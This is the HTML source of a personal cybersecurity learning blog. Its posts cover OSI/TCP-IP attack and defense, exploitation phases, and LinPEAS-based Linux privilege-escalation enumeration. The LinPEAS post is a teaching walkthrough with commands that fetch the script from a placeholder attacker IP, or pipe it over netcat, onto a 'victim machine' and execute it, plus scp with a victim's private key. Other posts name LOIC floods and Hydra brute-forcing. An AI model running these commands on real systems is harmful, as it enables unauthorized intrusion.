
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tobias Website</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <meta name="description" content="Explore Tobias A's portfolio - showcasing cybersecurity insights, tools, tips, and CTF rooms. Stay updated on threat intelligence and bug bounties.">

    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 0;
            font-family: 'Press Start 2P', sans-serif !important;
            background-color: #14161E;
            color: #e0e0e0;
            padding: 0 10px;
            box-sizing: border-box;
            overflow-x: hidden;
        }

        h1 {
            color: #2AF7A5;
        }
        
        /* Make sure the container uses flex to align items horizontally */
        .container {
            display: flex;             /* Ensure flex layout */
            justify-content: center;   /* Center items horizontally */
            align-items: center;       /* Vertically center items */
            gap: 15px;                 /* Add space between the button and link */
            margin-top: 50px;           /* Top margin to push the container down */
        }

        /* Back button container - just a style wrapper */
        .back-button-container {
            margin: 0;                 /* Reset any margins */
        }

        /* Style for both the button and the link (medium button) */
        .back-button, .medium-button {
            background-color: transparent;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            font-size: 1.2em;
            cursor: pointer;
            transition: color 0.3s, box-shadow 0.3s;
            text-decoration: none;  /* Removes underline from the link */
            display: flex;           /* Flexbox for centering icon and text */
            align-items: center;     /* Vertically center the icon and text */
            justify-content: center; /* Horizontally center icon and text */
        }

        /* Hover effect for both the button and the medium link */
        .back-button:hover, .medium-button:hover {
            color: #2AF7A5;
            animation: pulse 1s infinite;
            box-shadow: 0 0 10px #2AF7A5, 0 0 20px #2AF7A5, 0 0 30px #2AF7A5;
            border: 2px solid #2AF7A5;
        }

        /* Pulse animation for hover effect */
        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
            100% { transform: scale(1); opacity: 1; }
        }

        /* Make sure the link inside the nav has no underline */
        nav a {
            color: inherit;  /* Use inherited text color */
            text-decoration: none;  /* Remove underline */
        }


        .post {
            cursor: pointer;
            padding: 15px;
            border: 2px solid #2AF7A5;
            margin-bottom: 15px;
            background: #1e1f29;
            transition: all 0.3s ease-in-out;
            border-radius: 10px;
            width: 90%;
            max-width: 600px;
            position: relative;
        }

        h4 {
            color: #2AF7A5;
        }

        .post:hover {
            background: #252836;
        }

        .post.expanded {
            background: #2b2d42;
            padding: 40px;
            width: calc(100% - 40px); /* Keep the width responsive */
            max-width: 100vw; /* Ensure the width doesn't exceed the viewport width */
            height: auto;
            min-height: 600px; /* Set a minimum height for bigger appearance */
            transform: none;
            box-shadow: 0 10px 25px rgba(42, 247, 165, 0.3);
            z-index: 10;
            position: relative;
            overflow: hidden;
            margin: 20px 0; /* Add margin for gap between posts */
            box-sizing: border-box;
            transition: height 0.3s ease; /* Smooth transition for height change */
        }

        .post-content {
            display: none;
            margin-top: 15px;
            font-size: 1.1em;
            color: #fff;
            overflow-y: auto;
            max-height: 500px;
        }

        .post.expanded .post-content {
            display: block;
        }

        .close-btn {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 20px;
            cursor: pointer;
            color: #2AF7A5;
            display: none;
        }

        .post.expanded .close-btn {
            display: block;
        }

        table {
            width: 95%;
            border-collapse: collapse;
            background: #14161E;
        }
        th, td {
            padding: 10px;
            border: 1px solid #2AF7A5;
            text-align: left;
        }
        th {
            background-color: #333;
            color: white;
        }

        .link {
            color: #2AF7A5;
            text-decoration: none;
            font-weight: bold;
        }
        .link:hover {
            text-decoration: underline;
        }

        .terminal-container {
            width: 1100px;
            max-width: 90%;
            background-color: #14161E;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
            border: 1px solid #333;
        }
        .terminal-header {
            background-color: #222;
            padding: 6px 12px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .terminal-header .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
        }
        .red { background-color: #ff5f56; }
        .yellow { background-color: #ffbd2e; }
        .green { background-color: #27c93f; }
        .terminal-body {
            padding: 10px;
            color: #33ff33;
            font-size: 13px;
            line-height: 1.4;
            white-space: pre-wrap;
            font-family: "Fira Code", monospace;
            max-height: 300px;
            overflow-y: auto;
        }

        code {
            background-color: #f4f4f4;
            color: #d63384;
            font-family: 'Courier New', Courier, monospace;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 0.95em;
        }

    </style>
</head>

<body>

    <h1>Learning Hub</h1>

    <div class="container">
        <div class="back-button-container">
            <button class="back-button" onclick="window.location.href='index.html'">
                <i class="fas fa-home"></i> Intro
            </button>
        </div>
    
        <nav>
            <a href="https://medium.com/@vgqxjb" target="_blank" class="medium-button">
                <i class="fab fa-medium"></i> Medium
            </a>
        </nav>
    </div>    


    <h2>Latest Posts</h2>

    <div id="post1" class="post" onclick="togglePost(this)">
        <h3>The OSI Model and Its Security Concerns</h3>
        <div class="post-content">
            <p>This is my undertanding of the OSI model</p>
            <p>The OSI Model (Open Systems Interconnection Model) is a conceptual framework that standardizes how network devices communicate. It has seven layers, each serving a specific role in data transmission.</p>
            
            
            <!-- Adding an Image -->
            <img src="osi.png" alt="OSI Model Layers" style="width: 100%; max-width: 1650px; border-radius: 10px;">

            <h4>1. Physical Layer (Layer 1)</h4>
            <p><strong>Function:</strong> Deals with the physical connection between devices. It defines cables, radio waves, and hardware transmission.</p>
            <p><strong>Devices/Technologies:</strong> Ethernet cables, fiber optics, hubs, repeaters.</p>
            <p><strong>Security Concern:</strong> Physical tampering, wiretapping, jamming attacks.</p>
    
            <h4>2. Data Link Layer (Layer 2)</h4>
            <p><strong>Function:</strong> Handles error detection, framing, and MAC addressing. It ensures that data flows correctly between devices on the same network.</p>
            <p><strong>Devices/Technologies:</strong> Switches, MAC addresses, ARP (Address Resolution Protocol).</p>
            <p><strong>Security Concern:</strong> MAC spoofing, VLAN hopping attacks.</p>
    
            <h4>3. Network Layer (Layer 3)</h4>
            <p><strong>Function:</strong> Determines the best path for data to travel. Uses logical addressing (IP addresses).</p>
            <p><strong>Devices/Technologies:</strong> Routers, IP addressing (IPv4, IPv6), ICMP (ping).</p>
            <p><strong>Security Concern:</strong> IP spoofing, DDoS attacks, route hijacking.</p>
    
            <h4>4. Transport Layer (Layer 4)</h4>
            <p><strong>Function:</strong> Ensures complete data transfer using segmentation and reassembly. Manages TCP (connection-oriented) and UDP (connectionless) communication.</p>
            <p><strong>Devices/Technologies:</strong> Firewalls, TCP, UDP, ports.</p>
            <p><strong>Security Concern:</strong> Port scanning, SYN flood attacks.</p>
    
            <h4>5. Session Layer (Layer 5)</h4>
            <p><strong>Function:</strong> Establishes, maintains, and terminates communication sessions between devices.</p>
            <p><strong>Devices/Technologies:</strong> APIs, sockets, NetBIOS.</p>
            <p><strong>Security Concern:</strong> Session hijacking, MITM (Man-in-the-Middle) attacks.</p>
    
            <h4>6. Presentation Layer (Layer 6)</h4>
            <p><strong>Function:</strong> Formats, encrypts, and compresses data for the application layer.</p>
            <p><strong>Devices/Technologies:</strong> SSL/TLS, encryption standards (AES, RSA).</p>
            <p><strong>Security Concern:</strong> SSL/TLS vulnerabilities (e.g., downgrade attacks), insecure encryption.</p>
    
            <h4>7. Application Layer (Layer 7)</h4>
            <p><strong>Function:</strong> Interfaces with the end user. It includes protocols for web browsing, email, and file transfer.</p>
            <p><strong>Devices/Technologies:</strong> HTTP/S, FTP, DNS, SMTP.</p>
            <p><strong>Security Concern:</strong> SQL injection, cross-site scripting (XSS), phishing.</p>
    
            <h4>Real-World Example (Penetration Testing Perspective)</h4>
            <p><strong>Layer 1:</strong> Ensure there’s no unauthorized access to physical network devices.</p>
            <p><strong>Layer 2:</strong> Look for MAC spoofing or ARP poisoning opportunities.</p>
            <p><strong>Layer 3:</strong> Check for open ports and IP vulnerabilities.</p>
            <p><strong>Layer 4:</strong> Perform a SYN flood attack to test resilience.</p>
            <p><strong>Layer 5-7:</strong> Exploit web vulnerabilities like SQL injection, XSS, or weak SSL configurations.</p>

            <img src="osilayerattacks.png" alt="OSI Model Layers" style="width: 100%; max-width: 1650px; border-radius: 10px;">

            <h4>OSI Model in Network Defense</h4>
            <p><strong>Layer 1:</strong> Use of fiber-optic cables to prevent eavesdropping.</p>
            <p><strong>Layer 2:</strong> How VLAN segmentation can prevent internal threats.</p>
            <p><strong>Layer 3:</strong> IP filtering, firewalls, and VPNs for protecting routing.</p>
            <p><strong>Layer 4:</strong> Use of rate limiting, firewalls, and load balancing to protect from DoS attacks.</p>
            <p><strong>Layer 5:</strong> SSL/TLS encryption to protect session integrity.</p>
            <p><strong>Layer 6:</strong> Data encryption for protecting sensitive information.</p>
            <p><strong>Layer 7:</strong> Implement Web Application Firewalls and strong input validation.</p>

            <h4>Comparison of the OSI Model and TCP/IP Model</h4>
            <img src="osiandtcpmodel.png" alt="OSI Model Layers" style="width: 100%; max-width: 1650px; border-radius: 10px;">
            
            <h4>Network Protocols</h4>
        <p>Protocols are predefined rules that govern how data is formatted, transmitted, and processed to enable seamless communication between devices in a network. These protocols function across various layers within network models, each designed to manage specific data types and communication requirements.</p>

        <h4>Key Network Protocols</h4>
        <p>Network protocols define the rules for data exchange across networks, ensuring efficient and structured communication. Each protocol operates at a specific layer of the OSI model, managing different aspects of data transmission.</p>

        <table>
            <tr>
                <th>Protocol</th>
                <th>Description</th>
            </tr>
            <tr>
                <td><strong>HTTP (Hypertext Transfer Protocol)</strong></td>
                <td>Enables the transfer of web pages and online content. It functions at the Application Layer, allowing communication between browsers and web servers.</td>
            </tr>
            <tr>
                <td><strong>FTP (File Transfer Protocol)</strong></td>
                <td>Facilitates file transfers between systems, also operating at the Application Layer. It provides a method for uploading and downloading files from remote servers.</td>
            </tr>
            <tr>
                <td><strong>SMTP (Simple Mail Transfer Protocol)</strong></td>
                <td>Manages email transmission. As an Application Layer protocol, it ensures emails are sent from one server to another, reaching their intended recipients.</td>
            </tr>
            <tr>
                <td><strong>TCP (Transmission Control Protocol)</strong></td>
                <td>Provides reliable, connection-oriented communication with error checking and data recovery. Operating at the Transport Layer, it guarantees ordered and complete data delivery.</td>
            </tr>
            <tr>
                <td><strong>UDP (User Datagram Protocol)</strong></td>
                <td>Offers fast, connectionless communication without error recovery. Operating at the Transport Layer, it is ideal for applications prioritizing speed over reliability, such as streaming and gaming.</td>
            </tr>
            <tr>
                <td><strong>IP (Internet Protocol)</strong></td>
                <td>Handles packet addressing and routing across networks, ensuring data reaches the correct destination. It operates at the Internet Layer, guiding data through interconnected networks.</td>
            </tr>
        </table>

        </div>
    </div>

    <div id="post2" class="post" onclick="togglePost(this)">
        <h3>Understanding the TCP/IP Model</h3>
        <div class="post-content">
            <img src="tcpIP.png" alt="OSI Model Layers" style="width: 30%; max-width: 1650px; border-radius: 10px;">
            <p>So, we’ve all heard about the <strong>TCP/IP Model</strong>, but what exactly is it, and why should we care about it? Well, it’s basically the backbone of how the internet works. Without it, you wouldn’t be able to binge-watch Netflix, scroll through Instagram, or even check your email!</p>
    
            <h4>What is the TCP/IP Model?</h4>
            <p>The TCP/IP Model (Transmission Control Protocol/Internet Protocol) is a set of communication protocols that define how data is transmitted over a network. It's a more practical, real-world model than the OSI model and is the foundation for the internet and most networks.</p>
    
            <h4>Why do we need it?</h4>
            <p>Well, every time you send a message, share a file, or visit a website, data is passed between devices using the TCP/IP model. It’s like the secret sauce that makes everything connect, and without it, the internet wouldn’t even exist in the way we know it today.</p>
    
            <h4>The Four Layers of the TCP/IP Model</h4>
            <p>The TCP/IP model has <strong>4 layers</strong>, and each one is crucial in making sure data gets from point A to point B smoothly:</p>
    
            <h4>1. Link Layer</h4>
            <p><strong>What it does:</strong> This layer is all about the physical connection. It’s responsible for the hardware that sends and receives data – think Ethernet cables, Wi-Fi, and the devices that connect to the network. It’s like the roads and highways that connect cities. The Link Layer corresponds to the Physical and Data Link Layers of the OSI model, covering everything from the physical connection to data framing.</p>
            
            <h4>2. Internet Layer</h4>
            <p><strong>What it does:</strong> This is where things get interesting. The Internet layer is responsible for routing and addressing. The most famous protocol here is IP (Internet Protocol), which uses IP addresses to figure out where data needs to go. It’s like the GPS system of the internet. This layer corresponds to the Network Layer in the OSI model.</p>
    
            <h4>3. Transport Layer</h4>
            <p><strong>What it does:</strong> The transport layer ensures that the data gets to its destination safely and intact. This is where TCP (Transmission Control Protocol) comes in. It makes sure the data is delivered reliably, no matter how many stops it makes along the way. If something goes wrong, it’ll ask for a resend. Think of it like a mailman who double-checks that your package gets delivered correctly. This layer ensures that data packets are delivered in a sequential and error-free manner, corresponding to the Transport Layer of the OSI model.</p>
    
            <h4>4. Application Layer</h4>
            <p><strong>What it does:</strong> This is the layer that we, as users, interact with. The application layer includes all the protocols that help us use services like HTTP for web browsing, SMTP for sending emails, and FTP for transferring files. It’s what makes the internet usable for us. Without this layer, we wouldn’t have the web, email, or apps! This layer corresponds to the top three layers of the OSI model (Session, Presentation, and Application), providing interfaces and protocols necessary for data exchange between systems.</p>
    
            <h4>Real-Life Example</h4>
            <p>Imagine you’re sending an email. Here’s how the TCP/IP layers help out:</p>
            <ul>
                <li>Network Interface: Your computer physically connects to the network.</li>
                <li>Internet: The email gets a destination address (IP address) and is routed through the internet.</li>
                <li>Transport: TCP ensures that the email arrives without errors and is complete.</li>
                <li>Application: The email reaches the email server, and you see it in your inbox.</li>
            </ul>

            <p>When conducting penetration testing, it's essential to understand the TCP/IP model, as each layer has its own set of vulnerabilities. Here’s an example of a penetration test that targets each layer of the TCP/IP model, followed by the best defense strategies for each layer.</p>

        <h4>Layer 1: Network Interface Layer - ARP Spoofing</h4>
        <p><strong>Penetration Testing:</strong> At the Network Interface Layer, an attacker can perform ARP (Address Resolution Protocol) spoofing, also known as <strong>Man-in-the-Middle (MITM)</strong> attacks. This attack allows the attacker to intercept data being sent over the local network by poisoning the ARP cache, causing traffic to be sent to the attacker instead of the intended recipient.</p>

        <h4>Defense Strategy:</h4>
        <ul>
            <li><strong>Static ARP Entries:</strong> Use static ARP entries for critical devices (routers, servers) to prevent ARP poisoning.</li>
            <li><strong>Network Segmentation:</strong> Use VLANs to segment sensitive network traffic and minimize exposure to local attackers.</li>
            <li><strong>Intrusion Detection Systems (IDS):</strong> Implement IDS to detect unusual network traffic and ARP spoofing attempts.</li>
        </ul>

        <h4>Layer 2: Internet Layer - IP Spoofing</h4>
        <p><strong>Penetration Testing:</strong> In the Internet Layer, attackers can spoof IP addresses to disguise the origin of their traffic. This can be used for attacks like <strong>Denial of Service (DoS)</strong> or <strong>Distributed Denial of Service (DDoS)</strong> by flooding the target server with fake requests, making it difficult to trace the real attacker.</p>

        <h4>Defense Strategy:</h4>
        <ul>
            <li><strong>Ingress/Egress Filtering:</strong> Implement filtering on routers/firewalls to ensure only legitimate IP addresses are allowed to communicate.</li>
            <li><strong>Rate Limiting:</strong> Set rate limits on incoming traffic to prevent overwhelming servers with traffic from spoofed IP addresses.</li>
            <li><strong>Anti-Spoofing Configurations:</strong> Configure anti-spoofing rules on the router to check that the source IP matches the expected IP range.</li>
        </ul>

        <h4>Layer 3: Transport Layer - TCP SYN Flood</h4>
        <p><strong>Penetration Testing:</strong> The Transport Layer is where attackers often launch <strong>SYN Flood</strong> attacks. In this attack, the attacker sends a flood of TCP/SYN requests, causing the target machine to allocate resources and wait for the final acknowledgment, which never comes. This leads to a resource exhaustion and denial of service.</p>

        <h4>Defense Strategy:</h4>
        <ul>
            <li><strong>Flood Protection (SYN Cookies):</strong> Implement SYN cookies or SYN cache to handle incomplete TCP connections and prevent resource exhaustion.</li>
            <li><strong>Firewall Filtering:</strong> Use firewalls to detect and block high volumes of SYN packets from single or multiple sources.</li>
            <li><strong>Rate Limiting:</strong> Rate limit incoming connections to prevent an excessive number of requests from consuming resources.</li>
        </ul>

        <h4>Layer 4: Application Layer - HTTP Flood Attack</h4>
        <p><strong>Penetration Testing:</strong> At the Application Layer, attackers can flood a web server with HTTP requests to perform a <strong>DoS</strong> attack. This consumes server resources, potentially causing the site to crash or become slow. This is common in <strong>Layer 7 DDoS attacks</strong> targeting web applications.</p>

        <h4>Defense Strategy:</h4>
        <ul>
            <li><strong>Web Application Firewall (WAF):</strong> Use a WAF to filter and block malicious HTTP requests that are part of a DDoS attack.</li>
            <li><strong>Content Delivery Network (CDN):</strong> Use a CDN to distribute traffic and mitigate the impact of DDoS attacks.</li>
            <li><strong>Rate Limiting & CAPTCHAs:</strong> Implement rate limiting and CAPTCHAs on the application layer to prevent automated attacks.</li>
        </ul>

        <h4>Real-World Penetration Test Example</h4>
        <p>Let’s say you’re testing a web application for vulnerabilities. Here’s how the penetration test might go:</p>
        <ul>
            <li><strong>Network Interface:</strong> You could start by sniffing the network with tools like Wireshark and attempt ARP spoofing to capture sensitive data between clients and the server.</li>
            <li><strong>Internet Layer:</strong> Next, you may try IP spoofing to confuse the server or perform DDoS testing by flooding it with malicious packets.</li>
            <li><strong>Transport Layer:</strong> Using a tool like LOIC (Low Orbit Ion Cannon), you might simulate a SYN flood attack to exhaust the server's resources.</li>
            <li><strong>Application Layer:</strong> Finally, you could use a tool like Hydra to brute-force login forms, or perform an HTTP flood using LOIC to check the server's resilience against DDoS attacks.</li>
        </ul>

        <img src="tcpipattackdefense.png" alt="OSI Model Layers" style="width: 100%; max-width: 1650px; border-radius: 10px;">

        <h4>Defensive Measures Summary:</h4>
        <p>Penetration testing helps us identify vulnerabilities, but it’s crucial to implement the right defenses at each layer of the TCP/IP model:</p>
        <ul>
            <li><strong>Network Interface Layer:</strong> Static ARP entries, network segmentation, IDS.</li>
            <li><strong>Internet Layer:</strong> IP filtering, anti-spoofing, rate limiting.</li>
            <li><strong>Transport Layer:</strong> SYN cookies, firewall filtering, rate limiting.</li>
            <li><strong>Application Layer:</strong> WAF, CDN, rate limiting, CAPTCHAs.</li>
        </ul>
        
        <h4>Comparison of the OSI Model and TCP/IP Model</h4>
        <img src="osiandtcpmodel.png" alt="OSI Model Layers" style="width: 100%; max-width: 1650px; border-radius: 10px;">

        <h4>Functions of the Models</h4>
        <p>In real world networking, the TCP/IP model serves as the foundation for data transmission, widely utilized in diverse network infrastructures. Conversely, the OSI model, though not directly implemented, acts as a vital conceptual guide. It simplifies the intricacies of network communication, offering a structured perspective on how different components interact. Together, these models create a holistic understanding, connecting theoretical principles with practical execution in networking.</p>

        




        </div>
    </div>

    <div id="post3" class="post" onclick="togglePost(this)">
        <h3>Transmission in Networking</h3>
        <div class="post-content">
            <h4>Transmission in Networking</h4>
    
            <p>In networking, <strong>transmission</strong> is basically how data gets sent from one device to another over some kind of medium. To get a better grasp of this, let's break it down into three key areas: <strong>types of transmission, transmission modes, and transmission media</strong>.</p>
            
            <h4>Types of Transmission</h4>
            <p>There are two main ways data can be transmitted: <strong>analog and digital</strong>.</p>
            <ul>
                <li><strong>Analog transmission</strong> uses continuous signals to send information, like how traditional radios broadcast music. The signals vary smoothly, kind of like sound waves.</li>
                <li><strong>Digital transmission</strong>, on the other hand, breaks data into discrete units—<strong>bits (0s and 1s)</strong>—which makes it way more efficient and reliable for modern communication, like the internet and phone networks.</li>
            </ul>

            <h4>Transmission Modes</h4>
            <p>This refers to how data moves between devices. There are three main modes:</p>
            <ol>
                <li><strong>Simplex:</strong> One-way communication, like a keyboard sending input to a computer—data only flows in one direction.</li>
                <li><strong>Half-duplex:</strong> Two-way communication, but not at the same time. Think of a walkie-talkie—only one person can talk at a time.</li>
                <li><strong>Full-duplex:</strong> Two-way communication <strong>at the same time</strong>, like a phone call where both people can talk and listen simultaneously.</li>
            </ol>

            <h4>Transmission Media</h4>
            <p>This is just the <strong>physical or wireless path</strong> data takes to travel between devices. It’s divided into two main categories:</p>
            
            <h4>Wired Media</h4>
            <ul>
                <li><strong>Twisted pair cables:</strong> Used in Ethernet and LANs.</li>
                <li><strong>Coaxial cables:</strong> Used for cable TV.</li>
                <li><strong>Fiber optics:</strong> Uses light pulses for super-fast internet connections.</li>
            </ul>

            <h4>Wireless Media</h4>
            <ul>
                <li><strong>Radio waves:</strong> Used for Wi-Fi and cellular networks.</li>
                <li><strong>Microwaves:</strong> Used for satellites.</li>
                <li><strong>Infrared signals:</strong> Used in remote controls.</li>
            </ul>
            
        </div>
    </div>

    <div id="post4" class="post" onclick="togglePost(this)">
        <h3>Understanding the Differences Between Exploitation & Post-Exploitation</h3>
        <div class="post-content">
            
            <img src="exploitation.jpg" alt="OSI Model Layers" style="width: 99%; height: 400px; border-radius: 10px;">

            <p>Once an attacker gains a foothold in a target system, post-exploitation comes into play. This phase focuses on maintaining access, escalating privileges, Evasive Testing, Pillaging, Vulnerability Assessment, and gathering valuable data while staying undetected.</p>
    
            <p>To make it clearer, <strong>exploitation</strong> is when we attack the target from <strong>outside</strong>, aiming to gain initial access. This could be done by exploiting a vulnerability to get a <strong>reverse shell</strong> into their system.</p>

            <p>Once we are inside, we then decide what to do next whether to escalate privileges, maintain persistence, or move laterally. <strong>This phase is called post-exploitation.</strong> It's all about leveraging our access to gain more control, extract valuable data, and ensure we can come back later without detection.</p>

            <p>In short:</p>
            <ul>
                <li><strong>Exploitation</strong> = Gaining access (e.g., reverse shell, RCE, phishing).</li>
                <li><strong>Post-Exploitation</strong> = What we do after access (e.g., privilege escalation, persistence, lateral movement).</li>
            </ul>

            <p>If we gain access to a server that is already running with <strong>high privileges</strong> (such as root or administrator), the transition from <strong>exploitation</strong> to <strong>post-exploitation</strong> happens almost immediately. Since we already have elevated privileges, there’s no need for privilege escalation, and we can directly begin actions like <strong>maintaining access, extracting sensitive data, and moving laterally</strong> within the network. This rapid shift is an important distinction, as it allows attackers to quickly leverage their access without additional steps, making the system more vulnerable to further exploitation.</p>

        </div>
    </div>

    <div id="post5" class="post" onclick="togglePost(this)">
        <h3>Linux System Enumeration</h3>
        <div class="post-content">
            
            <img src="enumeratingsyetm.jpg" alt="OSI Model Layers" style="width: 70%; height: 400px; border-radius: 10px;">

            <p>System enumeration is a critical step in privilege escalation, as it provides the necessary insights to understand how to gain higher access levels and reach your goal, whether that’s information exfiltration or system manipulation. Without proper enumeration, achieving your objectives is nearly impossible, as lower privilege accounts generally lack the necessary permissions for sensitive actions.</p>

            <p>To effectively escalate privileges, the goal is to gather information that helps you map out the system's structure, its security posture, and potential weaknesses. Here's what needs to be collected:</p>

            <ul>
            <li><strong>System Information:</strong> Gather OS version, kernel version, architecture, and installed patches to identify vulnerabilities or known exploits related to the system setup.</li>
            <li><strong>User Information:</strong> Identify the current user’s privileges, list all system users, and check for sudo rights. Understanding user roles and privileges is critical for identifying potential avenues for escalation.</li>
            <li><strong>Network Information:</strong> Map out network interfaces, routing tables, and active connections. This information is crucial for lateral movement and identifying potential attack vectors.</li>
            <li><strong>Running Services:</strong> List active processes, open ports, and scheduled tasks. Services can often provide elevated access or valuable insights into system configuration.</li>
            <li><strong>File System:</strong> Identify interesting files, check for permission issues, and review mounted drives. Misconfigured file permissions can often lead to privilege escalation.</li>
            <li><strong>Installed Software:</strong> Review applications and their versions, looking for outdated or vulnerable software. Exploiting these can lead to higher privileges or even remote code execution.</li>
            <li><strong>Security Mechanisms:</strong> Examine firewall rules, SELinux status, and AppArmor profiles. Understanding these mechanisms is key to bypassing security restrictions or detecting vulnerabilities.</li>
            </ul>

            <p>I want to point out that system enumeration can be done manually, but there are also tools that automate this process. One such tool is <strong>Linux Privilege Escalation Awesome Script (LinPEAS)</strong>.</p>

            <p>LinPEAS is designed to automatically detect possible privilege escalation vectors on Linux systems. It scans the system for misconfigurations, outdated software, and other security weaknesses that could be exploited to gain higher privileges.</p>

            <p>You can download LinPEAS from the official repository: <a class="link" href="https://github.com/peass-ng/PEASS-ng" target="_blank">GPEASS-ng</a>.</p>

            <p>LinPEAS provides a rich, color-coded output to help users quickly identify potential security issues based on severity:</p>

            <ul>
                <li><span style="color: red;"><strong>Red:</strong></span> Highly probable privilege escalation vectors</li>
                <li><span style="color: yellow;"><strong>Yellow:</strong></span> Potential privilege escalation vectors that require further analysis</li>
                <li><span style="color: green;"><strong>Green:</strong></span> General information useful for manual enumeration</li>
            </ul>

            <p>This feature enhances usability by allowing security professionals to distinguish between different risk levels efficiently.</p>

            <p><strong>Key Features of LinPEAS</strong></p>

            <p>LinPEAS is designed to automate the process of identifying privilege escalation opportunities. Its key features include, but are not limited to:</p>

            <ul>
                <li>Automated detection of common privilege escalation vectors</li>
                <li>Identification of misconfigurations in services, cron jobs, and SUID/SGID binaries</li>
                <li>Detection of credentials in files, environment variables, or process memory</li>
                <li>Checking for vulnerable software versions and known kernel exploits</li>
                <li>Analysis of sudo privileges and other permission-related issues</li>
                <li>Enumeration of sensitive information that could aid lateral movement</li>
            </ul>

            <h4>Intallation</h4>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>
                <div class="terminal-body">
kali@kali:~$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
        
--2025-02-27 06:22:39--  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/linpeas.sh [following]
--2025-02-27 06:22:39--  https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/linpeas.sh
<SNIP>
linpeas.sh                      100%[=================================================================>] 820.39K  --.-KB/s    in 0.09s
        
2025-02-27 06:22:40 (8.96 MB/s) - ‘linpeas.sh’ saved [840082/840082]
                </div>
            </div><br>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>

                <div class="terminal-body">
kali@kali:~$ ls

linpeas.sh
                </div>
            </div><br>

            <p>Uploading via scp</p>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>

                <div class="terminal-body">
kali@kali:~$ scp -i -private-key- -file-to-transfer- -username-@-ip-address-:-path-to-store-
                </div>
            </div> 

            <p>If you have the private key (id_rsa) and SSH access to the victim machine, you can upload the file using the following approach.</p>

            <p>Uploading via scp</p>

            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="dot red"></div>
                    <div class="dot yellow"></div>
                    <div class="dot green"></div>
                </div>

                <div class="terminal-body">
kali@kali:~$ scp -i id_rsa ./linpeas.sh john@10.129.12.10:/home/john

linpeas.sh                                                                           100%  820KB   1.6MB/s   00:00
                </div>
            </div> 

          <h4>Different way to upload this file</h4>

          <p>1: Uploading via Python HTTP Server (If No Internet on Target)</p>

          <p>If the target cannot download files directly but you have access to an internal pivot machine or your attacker machine, you can start a simple web server and pull the file from there.</p>

          <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ cd /path/to/linpeas

kali@kali:~$ python3 -m http.server 8080                                                                           100%  820KB   1.6MB/s   00:00
            </div>
          </div><br>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ wget http://YOUR_ATTACKER_IP:8080/linpeas.sh

kali@kali:~$ chmod +x linpeas.sh

kali@kali:~$ ./linpeas.sh
            </div>
        </div>


        <p>2: Uploading via Netcat (If You Have a Reverse Shell)</p>
        <p>If you have a shell on the victim machine, but no direct internet, you can transfer LinPEAS using nc.</p>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ nc -lvnp 4444 < linpeas.sh
            </div>
        </div>

        <p>On the victim machine:</p>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ nc YOUR_ATTACKER_IP 4444 > linpeas.sh

kali@kali:~$ chmod +x linpeas.sh

kali@kali:~$ ./linpeas.sh
            </div>
        </div>

        <p>After we have successfully transferred the script, we can log in to the target and check if it’s there.</p>

        <p>Linpeas offer many options: by using the bash linpeas.sh --help command. it woudl show you something like this:</p>

        <div class="terminal-container">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>

            <div class="terminal-body">
kali@kali:~$ linpeas.sh -h

Enumerate and search Privilege Escalation vectors.
This tool enum and search possible misconfigurations (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...) inside the host and highlight possible misconfigurations with colors.
        Checks:
            -a Perform all checks: 1 min of processes, su brute, and extra checks.
            -o Only execute selected checks (system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex). Select a comma separated list.
            -s Stealth & faster (don't check some time consuming checks)
            -e Perform extra enumeration
            -r Enable Regexes (this can take from some mins to hours)
            -P Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
            -D Debug mode

        Network recon:
            -t Automatic network scan - This option writes to files
            -d [IP/NETMASK] Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
